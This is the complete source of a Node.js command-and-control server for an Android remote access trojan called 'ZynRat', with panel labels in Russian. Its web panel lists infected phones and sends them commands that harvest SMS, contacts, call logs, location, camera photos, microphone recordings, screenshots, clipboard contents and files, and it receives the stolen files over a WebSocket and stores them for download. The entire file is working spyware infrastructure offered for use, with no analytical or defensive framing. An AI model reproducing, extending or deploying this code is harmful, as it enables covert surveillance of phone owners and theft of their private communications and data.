const WebSocket = require('ws');
const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const AUTH_KEY = 'zyn_' + Math.random().toString(36).substr(2, 16);

const UPLOAD_DIR = '/tmp/uploads';
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const clients = new Map();
const results = [];
const files = [];
let nextId = 1;

const app = express();
app.use(express.json());

app.get('/', (req, res) => {
  const list = [];
  for (const [id, client] of clients.entries()) {
    list.push({
      id: id,
      device: client.device || 'unknown',
      ip: client.ip || 'unknown',
      online: client.ws.readyState === WebSocket.OPEN
    });
  }

  let clientsHtml = '';
  if (list.length === 0) clientsHtml = '<p>Пока нет подключений</p>';
  else {
    for (const c of list) {
      clientsHtml += '<div class="client"><b>#' + c.id + '</b> ' + String(c.device).substring(0, 100) + '<br>' +
        'IP: ' + c.ip + ' • ' + (c.online ? 'online' : 'offline') + '<br>' +
        '<a href="/cmd?id=' + c.id + '&cmd=/ping">/ping</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/info">/info</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/apps">/apps</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/sms">/sms</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/contacts">/contacts</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/call_log">/call_log</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/location">/location</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/photo">/photo</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/back">/back</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/mic 10">/mic 10</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/screenshots">/screenshots</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/photos_send">/photos</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/ls /sdcard">/ls</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/clip">/clip</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/battery">/battery</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/vibrate 3">/vibrate</a> ' +
        '<a href="/cmd?id=' + c.id + '&cmd=/lock">/lock</a> ' +
        '</div>';
    }
  }

  let resultsHtml = '';
  for (let i = results.length - 1; i >= 0; i--) {
    const r = results[i];
    resultsHtml += '<div class="result"><b>#' + r.id + ' ' + r.cmd + '</b><br>' +
      '<pre>' + esc(String(r.result).substring(0, 3000)) + '</pre></div>';
  }

  let filesHtml = '';
  for (let i = files.length - 1; i >= 0; i--) {
    const f = files[i];
    filesHtml += '<div class="file"><b>#' + f.id + ' ' + f.name + '</b> (' + fmt(f.size) + ')<br>' +
      '<a href="/download/' + f.stored + '">📥 Скачать</a></div>';
  }

  res.send('<!DOCTYPE html><html><head><meta charset="UTF-8">' +
    '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
    '<title>ZynRat Panel</title><style>' +
    'body{font-family:monospace;background:#0a0e1a;color:#00d4ff;padding:16px;}' +
    'h1{color:#a855f7;}h2{color:#00ff41;border-bottom:1px solid #333;padding-bottom:4px;margin-top:24px;}' +
    '.client,.result,.file{background:#15192a;padding:12px;margin:8px 0;border-radius:8px;}' +
    '.result{border-left:3px solid #a855f7;}' +
    '.file{border-left:3px solid #00ff41;}' +
    'pre{white-space:pre-wrap;word-wrap:break-word;color:#8899aa;font-size:12px;}' +
    'a{color:#00d4ff;text-decoration:none;margin-right:6px;}a:hover{color:#a855f7;}' +
    '.status{background:#1a3a1a;padding:8px;border-radius:6px;margin-bottom:16px;}' +
    '</style></head><body>' +
    '<h1>⚡ ZynRat Panel</h1>' +
    '<div class="status">Online: <b>' + list.filter(c => c.online).length + '</b> / ' + list.length +
    '<br>Auth: <b>' + AUTH_KEY + '</b></div>' +
    '<h2>📱 Устройства</h2>' + clientsHtml +
    '<h2>📁 Файлы</h2>' + (filesHtml || '<p>Пока файлов нет</p>') +
    '<h2>📋 Результаты</h2>' + (resultsHtml || '<p>Пока результатов нет</p>') +
    '</body></html>');
});

function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
function fmt(b) { return b < 1024 ? b + ' B' : b < 1024 * 1024 ? (b / 1024).toFixed(0) + ' KB' : (b / 1024 / 1024).toFixed(1) + ' MB'; }

// Скачивание файла
app.get('/download/:id', (req, res) => {
  const id = req.params.id;
  const f = files.find(x => x.stored === id);
  if (!f) return res.status(404).send('not found');
  res.download(f.path, f.name);
});

app.get('/cmd', (req, res) => {
  const id = parseInt(req.query.id);
  const cmd = req.query.cmd;
  const client = clients.get(id);
  if (!client) return res.send('Device not found: #' + id);
  if (!cmd) return res.send('No cmd');
  try {
    client.ws.send(JSON.stringify({ type: 'cmd', cmd: cmd }));
    console.log('[->] #' + id + ' cmd: ' + cmd);
    res.redirect('/');
  } catch (e) {
    res.send('Error: ' + e.message);
  }
});

app.get('/api', (req, res) => {
  const list = [];
  for (const [id, client] of clients.entries()) {
    list.push({ id: id, device: client.device, ip: client.ip, online: client.ws.readyState === WebSocket.OPEN });
  }
  res.json({ server: 'ZynRat', online: list.filter(c => c.online).length, total: list.length, clients: list, results: results.slice(-20), files: files.slice(-20) });
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server, maxPayload: 100 * 1024 * 1024 });

wss.on('connection', (ws, req) => {
  const id = nextId++;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const client = { ws: ws, ip: ip, device: null, id: id };
  clients.set(id, client);
  console.log('[+] #' + id + ' from ' + ip);

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg.toString());

      if (data.type === 'hello') {
        client.device = data.device;
        console.log('[i] Device #' + id);
        ws.send(JSON.stringify({ type: 'welcome', id: id, authKey: AUTH_KEY }));
      } else if (data.type === 'result') {
        console.log('[<-] #' + id + ' ' + data.cmd);
        results.push({ id: data.id, cmd: data.cmd, result: data.result, time: Date.now() });
        if (results.length > 100) results.shift();
      } else if (data.type === 'file') {
        // Сохраняем файл на сервере
        console.log('[FILE] #' + id + ' ' + data.name + ' (' + data.data.length + ' b64)');
        try {
          const buf = Buffer.from(data.data, 'base64');
          const stored = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
          const filePath = path.join(UPLOAD_DIR, stored);
          fs.writeFileSync(filePath, buf);

          files.push({
            id: data.id,
            cmd: data.cmd,
            name: data.name,
            stored: stored,
            path: filePath,
            size: buf.length,
            time: Date.now()
          });
          if (files.length > 200) files.shift();

          results.push({
            id: data.id,
            cmd: data.cmd,
            result: '📁 Файл получен: ' + data.name + ' (' + buf.length + ' bytes) — скачать в разделе Файлы',
            time: Date.now()
          });
        } catch (e) {
          console.log('[!] file save error:', e.message);
        }
      }
    } catch (e) {
      console.log('[!] Parse error: ' + e.message);
    }
  });

  ws.on('close', () => { console.log('[-] #' + id + ' disconnected'); });
});

server.listen(PORT, () => {
  console.log('ZynRat C2 Server on port ' + PORT);
  console.log('Auth: ' + AUTH_KEY);
});
